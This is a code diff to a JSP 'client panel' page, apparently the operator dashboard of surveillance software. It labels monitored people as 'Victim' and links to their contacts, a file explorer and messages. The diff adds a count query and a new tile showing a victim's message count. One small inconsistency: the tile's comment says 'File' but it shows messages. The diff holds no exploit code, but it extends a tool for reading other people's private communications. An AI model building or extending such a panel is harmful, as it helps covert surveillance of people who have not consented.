@@ -2,6 +2,8 @@
 <%@ page import="com.theah64.xrob.api.models.Victim" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.util.HashMap" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -72,6 +74,11 @@
 
         <div class="row" style="margin-top: 20px;">
 
+            <%
+                //Trying to get count of all items in a single query
+                final Map<String,Integer> countMap = BaseTable.getAllCounts();
+            %>
+
             <%--Contacts--%>
             <div class="col-lg-3">
                 <a href="/client/victim/contacts/<%=victimCode%>">
@@ -120,7 +127,7 @@
                         <p class="profile_grid_main_title">F
                         </p>
 
-                        <p class="profile_grid_sub_title">Files</p>
+                        <p class="profile_grid_sub_title">File Explorer</p>
                     </div>
                 </a>
             </div>
@@ -142,6 +149,20 @@
                     </div>
                 </a>
             </div>
+
+
+            <%--File--%>
+            <div class="col-lg-3">
+                <a href="<%=msgCount>0 ? "/client/victim/" +victimCode + "/media/files" : "#"%>">
+                    <div class="profile_grid <%=msgCount==0 ? "inactive" : ""%>">
+                        <p class="profile_grid_main_title"><%=msgCount%>
+                        </p>
+
+                        <p class="profile_grid_sub_title">Messages</p>
+                    </div>
+                </a>
+            </div>
+
 
         </div>
 
